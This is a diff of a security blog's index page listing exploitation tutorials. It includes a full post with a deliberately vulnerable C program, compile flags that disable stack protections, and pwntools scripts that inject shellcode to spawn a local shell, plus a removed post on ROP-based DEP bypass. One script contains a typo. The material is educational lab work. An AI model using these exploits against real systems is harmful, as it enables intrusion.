@@ -131,7 +131,7 @@
       <div class="body-wrap">
         
   
-    <article id="post-看雪CTF-2016第七题调试部分" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-pwn练习(一)之缓冲区溢出" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -141,7 +141,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/19/看雪CTF-2016第七题调试部分/">看雪CTF-2016第七题调试部分</a>
+      <a class="article-title" href="/2016/06/29/pwn练习(一)之缓冲区溢出/">pwn练习(一)之缓冲区溢出</a>
     </h1>
   
       
@@ -149,21 +149,448 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>源程序：<a href="http://pan.baidu.com/s/1c2kiXbi">http://pan.baidu.com/s/1c2kiXbi</a><br>由于最后的算法涉及到数学问题，而且需要枚举85位数字+字母的组合。。。感觉这题的作者是要报复社会！其实这题的难点还是挺多的，有必要记录一下这次的收获，对调试多线程有了更深一步的了解。<br>
+        <p><a href="/image/pwn练习一之缓冲区溢出/passcode">passcode</a></p>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/19/看雪CTF-2016第七题调试部分/#more">more >></a>
+          <a class="article-more-a"  href="/2016/06/29/pwn练习(一)之缓冲区溢出/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/11/19/看雪CTF-2016第七题调试部分/" class="archive-article-date">
-  	<time datetime="2016-11-19T02:46:35.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-19</time>
+      <a href="/2016/06/29/pwn练习(一)之缓冲区溢出/" class="archive-article-date">
+  	<time datetime="2016-06-29T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-29</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PWN练习之爆破绕过canary" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/19/PWN练习之爆破绕过canary/">PWN练习之爆破绕过canary</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="/image/PWN练习之爆破绕过canary/test.zip">test</a><br>使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/06/19/PWN练习之爆破绕过canary/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/06/19/PWN练习之爆破绕过canary/" class="archive-article-date">
+  	<time datetime="2016-06-19T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-19</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Linux安全之canary" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/15/Linux安全之canary/">Linux安全之canary</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先我们了解一下canary的机制。canary类似于windows中GS机制，普通的函数栈如下：<br>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/06/15/Linux安全之canary/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/06/15/Linux安全之canary/" class="archive-article-date">
+  	<time datetime="2016-06-15T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-15</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-漏洞挖掘基础之格式化字符串" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/08/漏洞挖掘基础之格式化字符串/">漏洞挖掘基础之格式化字符串</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-基础知识—栈"><a href="#0x01-基础知识—栈" class="headerlink" title="0x01 基础知识—栈"></a>0x01 基础知识—栈</h2>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/06/08/漏洞挖掘基础之格式化字符串/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/06/08/漏洞挖掘基础之格式化字符串/" class="archive-article-date">
+  	<time datetime="2016-06-08T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-08</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Linux下的缓冲区溢出攻击(三)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/30/Linux下的缓冲区溢出攻击(三)/">Linux下的缓冲区溢出攻击(三)</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这一节来看一下如何通过内存泄露，来确定程序中任意函数的地址。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/05/30/Linux下的缓冲区溢出攻击(三)/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/05/30/Linux下的缓冲区溢出攻击(三)/" class="archive-article-date">
+  	<time datetime="2016-05-30T01:34:01.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-30</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Linux下的缓冲区溢出攻击(二)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/23/Linux下的缓冲区溢出攻击(二)/">Linux下的缓冲区溢出攻击(二)</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在（一）中介绍了如何动态调试缓冲区漏洞的过程。但是由于有很多局限没有成功，所以这里简单介绍一下如何使用gdb工具中的dump等来调试程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include</div><div class="line">void func()&#123;</div><div class="line">    char name[0x50];   </div><div class="line">    read(0, name, 0x100);    write(1, name, 0x100);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 1.c -o 1 -O0 -fno-stack-protector -z execstack</div></pre></td></tr></table></figure></p>
+<p>m32:生成32bit程序需要gcc-multilib(x86机器上编译不用加)<br>O0:不进行任何优化<br>fno-stack-protector:不开启canary栈溢出检测<br>z execstack:开启栈可执行关闭NX</p>
+<p>从IDA可以看出 ebp-0x58和ebp+0x4相差了92个字节,即ret的地址。<br><img src="/image/Linux下的缓冲区溢出攻击/6.png" alt="这里写图片描述"></p>
+<p>其实也可以用pattern_create和pattern_offset：</p>
+<p>生成：<br><img src="/image/Linux下的缓冲区溢出攻击/7.png" alt="这里写图片描述"></p>
+<p>将这段复制到输入，然后用pattern_offset：<br><img src="/image/Linux下的缓冲区溢出攻击/8.png" alt="这里写图片描述"></p>
+<p>上一节说了，由于gdb调试时和程序运行时也有差别，所以这里需要开启core dump来查看栈地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ulimit -c unlimited</div></pre></td></tr></table></figure></p>
+<p>然后调试程序，让其崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">s = process(&apos;./olverflow&apos;)</div><div class="line">payload = &apos;a&apos;*92</div><div class="line">payload += p32(0x11111111)</div><div class="line">pay += &apos;A&apos;*10</div><div class="line"></div><div class="line">s.send(payload)</div><div class="line">s.interactive()</div></pre></td></tr></table></figure></p>
+<p>然后生成了一个core.xxx的文件，使用gdb -c core.xxx调试它：<br><img src="/image/Linux下的缓冲区溢出攻击/9.png" alt="这里写图片描述"></p>
+<p>可以看到我们后面输入的A（0x41）的地址为0xffffd0d0，所以网上找<a href="https://www.exploit-db.com/exploits/13312/" target="_blank" rel="external">shellcode</a>，并将py程序改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">s = process(&apos;./olverflow&apos;)</div><div class="line">payload = &apos;a&apos;*92</div><div class="line">payload += p32(0xffffd0d0)</div><div class="line">payload += &quot;\xeb\x11\x5e\x31\xc9\xb1\x32\x80&quot;</div><div class="line">payload += &quot;\x6c\x0e\xff\x01\x80\xe9\x01\x75&quot;</div><div class="line">payload += &quot;\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;</div><div class="line">payload += &quot;\x32\xc1\x51\x69\x30\x30\x74\x69&quot;</div><div class="line">payload += &quot;\x69\x30\x63\x6a\x6f\x8a\xe4\x51&quot;</div><div class="line">payload += &quot;\x54\x8a\xe2\x9a\xb1\x0c\xce\x81&quot;</div><div class="line"></div><div class="line">s.send(payload)</div><div class="line">s.interactive()</div></pre></td></tr></table></figure>
+<p><img src="/image/Linux下的缓冲区溢出攻击/10.png" alt="这里写图片描述"><br>得到shell</p>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/05/23/Linux下的缓冲区溢出攻击(二)/" class="archive-article-date">
+  	<time datetime="2016-05-23T06:15:25.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-23</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-retn的作用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/17/retn的作用/">retn的作用</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<p>就是子程序返回，然后把堆栈的N个字节弹出来。<br>其实就是执行ret后，将n加入sp中，实际上是从堆栈中弹出n个字节的数据，以冲掉在call指令前压入堆栈的参数。<br>相当于这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ret</div><div class="line">add sp，n</div></pre></td></tr></table></figure></p>
+<p>因为8086/8088的堆栈是字堆栈（就是说进栈出栈都是16位的），所以，ret n中的n必须是偶数。</p>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/05/17/retn的作用/" class="archive-article-date">
+  	<time datetime="2016-05-17T09:29:28.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-17</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Linux下的缓冲区溢出攻击(一)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/13/Linux下的缓冲区溢出攻击(一)/">Linux下的缓冲区溢出攻击(一)</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/05/13/Linux下的缓冲区溢出攻击(一)/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/05/13/Linux下的缓冲区溢出攻击(一)/" class="archive-article-date">
+  	<time datetime="2016-05-13T05:06:48.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-13</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-简单的分配栈帧及溢出修改相邻变量" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/">简单的分配栈帧及溢出修改相邻变量</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>上一段简单的源码：</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/" class="archive-article-date">
+  	<time datetime="2016-05-11T09:09:59.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-11</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
 	</div>
 
       
@@ -193,7 +620,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/13/在栈中利用SEH/">在栈中利用SEH</a>
+      <a class="article-title" href="/2016/05/05/在栈中利用SEH/">在栈中利用SEH</a>
     </h1>
   
       
@@ -203,458 +630,19 @@
       
         <p>文中用到的两个插件：<br><a href="/image/在栈中利用SEH/ollysseh.zip">ollysseh</a><br><a href="/image/在栈中利用SEH/findjmp.exe">findjmp.exe</a><br>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/13/在栈中利用SEH/#more">more >></a>
+          <a class="article-more-a"  href="/2016/05/05/在栈中利用SEH/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/11/13/在栈中利用SEH/" class="archive-article-date">
-  	<time datetime="2016-11-13T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-13</time>
+      <a href="/2016/05/05/在栈中利用SEH/" class="archive-article-date">
+  	<time datetime="2016-05-05T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-05</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Hexo站点优化" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/08/Hexo站点优化/">Hexo站点优化</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>上一篇博客中介绍了Hexo的站点配置及与GitHub的关联操作,这篇主要是介绍为Hexo博客添加多说评论以及增加访客统计功能~~</p>
-<ol>
-<li>0x1 添加多说评论<br>Hexo默认使用国外比较流行的dispus，在国内大多数用的是多说评论。支持一些国产，而且试了一下超级简单，分分钟就能搞定。</li>
-</ol>
-<p>首先，去多说官网注册一下。我直接用QQ号就能登录了，然后就是设置一些信息：<br>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/08/Hexo站点优化/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/11/08/Hexo站点优化/" class="archive-article-date">
-  	<time datetime="2016-11-08T07:05:22.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-08</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/">Hexo</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-使用Hexo-Ghuhub搭建个人博客" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/">使用Hexo+Git搭建个人博客</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备:"></a>安装准备:</h2><p>1.Node.js、Git、Github<br>2.本地搭建Hexo框架，本地服务器测试，配置主题，修改参数等等<br>3.本地Git+Hex与Github关联</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/" class="archive-article-date">
-  	<time datetime="2016-11-07T02:36:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-07</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/">Hexo</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Windows下的ROP绕过DEP保护" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/04/Windows下的ROP绕过DEP保护/">Windows下的ROP绕过DEP保护</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这篇介绍经典的DEP绕过方法：通过VirtualProtect绕过DEP。<br><a href="/image/Windows下的ROP绕过DEP保护/test.exe）
-什么是DEP呢？
-溢出攻击的根源在于计算机对数据和代码没有明确区分，如果将代码放置于数据段，那么系统就会去执行
-为了弥补这一缺陷，微软从XP SP2开始支持数据执行保护(Data Exection Prevention">test.exe</a></p>
-<p>DEP保护的原理，就是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令</p>
-<p>如果我们让程序跳转到一个已经存在的系统函数中去呢？这时的DEP是不会拦截的，也就有了我们的ROP攻击。<br>简而言之，只要为shellcode中的每条指令都在代码区找到替代指令，就可以完成我们的功能了。但是这种操作难度极大，并不是每条指令都能找到，所以就有了以下三种折中的办法:</p>
-<pre><code>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行
-通过跳转到VirtualProtect函数来讲shellcode所在内存页设置为可执行状态，然后再转入shellcode执行。
-通过跳转到VirtualAllloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到这段内存中执行。
-</code></pre><p>这一节根据实例，介绍通过方法2来绕过DEP。</p>
-<p>先来看VirtualProtect函数：</p>
-<p>BOOL VirtualProtect{<br>LPVOID lpAddress,<br>DWORD dwsize,<br>DWORD flNewProtect,<br>PDWORD lpflOldProtect<br>}</p>
-<p>lpAddress:内存起始地址<br>dwsize:内存区域大小<br>flNewProtect:内存属性，PAGE_EXECUTE_READWRITE(0x40)<br>lpflOldProtect:内存原始属性保存地址</p>
-<p>先看程序，还是简单的栈溢出，只不过开了DEP保护：<br><img src="/image/Windows下的ROP绕过DEP保护/1.png" alt="这里写图片描述"></p>
-<p>使用ImmunityDebugger和插件mona，可以构造rop链：</p>
-<p>!mona rop -m *.dll -cp nonull</p>
-<p>执行后，会在ImmunityDebugger文件夹下生成<br>rop.txt、rop_chains.txt、rop_suggestions.txt、stackpivot.txt。<br>我们查看其中的rop_chains，选择其中的[C]：<br><img src="/image/Windows下的ROP绕过DEP保护/2.png" alt="这里写图片描述"></p>
-<p>这就是我们需要的ROP链了，前面跟上溢出长度，后面跟上我们的shellcode即可。</p>
-<p>执行起来，可以看到我们的堆栈编程这样：<br><img src="/image/Windows下的ROP绕过DEP保护/3.png" alt="这里写图片描述"></p>
-<p>F8往下走，可以看到经过一系列pop和retn可以在栈上构造VrtualProtect函数需要的参数，并调用该函数，可以通过eax判断是否调用成功：<br><img src="/image/Windows下的ROP绕过DEP保护/4.png" alt="这里写图片描述"></p>
-<p>然后就走到call esp：<br><img src="/image/Windows下的ROP绕过DEP保护/5.png" alt="这里写图片描述"></p>
-<p>这里到后面都是我们自己构造的shellcode了。</p>
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/11/04/Windows下的ROP绕过DEP保护/" class="archive-article-date">
-  	<time datetime="2016-11-04T14:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-04</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-看雪CTF-2016第一题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/03/看雪CTF-2016第一题Writeup/">看雪CTF 2016第一题Writeup</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>源程序：<a href="http://pan.baidu.com/s/1qYzsTic">http://pan.baidu.com/s/1qYzsTic</a><br>一个菜鸟的分析，将就着看吧</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/03/看雪CTF-2016第一题Writeup/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/11/03/看雪CTF-2016第一题Writeup/" class="archive-article-date">
-  	<time datetime="2016-11-03T06:35:33.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-03</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Windows下漏洞调试神器mona" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/10/26/Windows下漏洞调试神器mona/">Windows下漏洞调试神器之mona</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>corelan团队的mona插件，可以运行在Windbg和ImmunityDebugger中。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/10/26/Windows下漏洞调试神器mona/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/10/26/Windows下漏洞调试神器mona/" class="archive-article-date">
-  	<time datetime="2016-10-26T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-10-26</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
